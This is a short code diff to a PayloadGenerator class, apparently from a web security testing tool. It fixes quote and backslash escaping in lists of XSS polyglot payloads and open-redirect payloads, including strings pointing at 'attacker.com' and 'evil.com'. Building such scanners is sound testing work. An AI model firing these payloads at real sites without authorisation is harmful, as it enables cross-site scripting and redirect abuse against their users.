@@ -60,7 +60,7 @@ class PayloadGenerator:
         ]
         
         polyglot_payloads = [
-            "javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*",
+            "javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*",
             "'onerror=alert()",
             "\"><img src=x onerror=alert()>",
             "</script><svg onload=alert()>"
@@ -282,7 +282,7 @@ class PayloadGenerator:
             "//attacker.com",
             "/\\evil.com",
             "https://",
-            "/.\",
+            "/.\\",
             "javascript:alert(1)",
             "javascript://alert(1)",
             "javascript:/*alert(1)*/",
